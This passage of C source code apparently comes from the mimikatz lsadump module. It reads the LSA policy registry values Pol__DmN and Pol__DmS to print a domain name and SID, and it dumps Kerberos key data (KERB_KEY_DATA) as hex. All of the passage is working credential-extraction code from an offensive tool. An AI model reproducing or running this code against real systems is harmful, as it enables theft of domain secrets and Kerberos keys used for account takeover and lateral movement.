	wchar_t name[] = L"Pol__DmN", sid[] = L"Pol__DmS";
	PVOID buffer;
	LSA_UNICODE_STRING uString = {0, 0, NULL};

	RtlCopyMemory(&name[3], littleKey, 2*sizeof(wchar_t));
	RtlCopyMemory(&sid[3], littleKey, 2*sizeof(wchar_t));
	kprintf(L"%s name : ", prefix);
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, name, NULL, NULL, &buffer, NULL))
	{
		uString.Length = ((PUSHORT) buffer)[0];
		uString.MaximumLength = ((PUSHORT) buffer)[1];
		uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
		kprintf(L"%wZ", &uString);
		LocalFree(buffer);
	}
	if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicyBase, sid, NULL, NULL, &buffer, NULL))
	{
		kprintf(L" ( ");
		kull_m_string_displaySID((PSID) buffer);
		kprintf(L" )");
		LocalFree(buffer);
	}
	kprintf(L"\n");
	return status;
}

PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
{
	USHORT i;
	if (Count)
	{
		if (title)
			kprintf(L"    %s\n", title);
		for (i = 0; i < Count; i++)
		{
			// kprintf(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
			kull_m_string_wprintf_hex((PBYTE)base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			kprintf(L"\n");
		}
	}
	return (PKERB_KEY_DATA)((PBYTE)keys + Count * sizeof(KERB_KEY_DATA));
}

PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
{
	USHORT i;
	if (Count)
	{
		if (title)
			kprintf(L"    %s\n", title);
		for (i = 0; i < Count; i++)
		{
			// kprintf(L"      %s (%u) : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
			kull_m_string_wprintf_hex((PBYTE)base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			kprintf(L"\n");
		}
	}
	return (PKERB_KEY_DATA_NEW)((PBYTE)keys + Count * sizeof(KERB_KEY_DATA_NEW));
}